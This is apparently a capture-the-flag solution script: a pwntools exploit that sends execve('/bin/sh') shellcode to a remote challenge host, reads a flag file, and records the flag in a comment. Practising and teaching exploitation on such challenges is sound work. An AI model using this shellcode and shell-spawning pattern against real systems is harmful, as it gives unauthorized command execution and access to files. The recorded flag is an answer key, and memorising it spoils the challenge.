# flag{n0_64bit_sh3llc0de_det3ct3d!}
from pwn import *

target = remote("babyshellcode.payatu.co", 44442)

'''
0:  49 bf 2f 62 69 6e 2f    movabs r15,0x68732f6e69622f
7:  73 68 00
a:  41 57                   push   r15
c:  54                      push   rsp
d:  6a 00                   push   0x0
f:  6a 00                   push   0x0
11: 5e                      pop    rsi
12: 5a                      pop    rdx
13: 5f                      pop    rdi
14: 6a 3b                   push   0x3b
16: 58                      pop    rax
17: 0f 05                   syscall
'''
shellcode = "\x49\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x41\x57\x54\x6A\x00\x6A\x00\x5E\x5A\x5F\x6A\x3B\x58\x0F\x05"
target.sendline(shellcode)

target.sendline("cat /home/vuln/flag.txt")
target.recvuntil(": ")

print target.recvuntil("}")

target.close()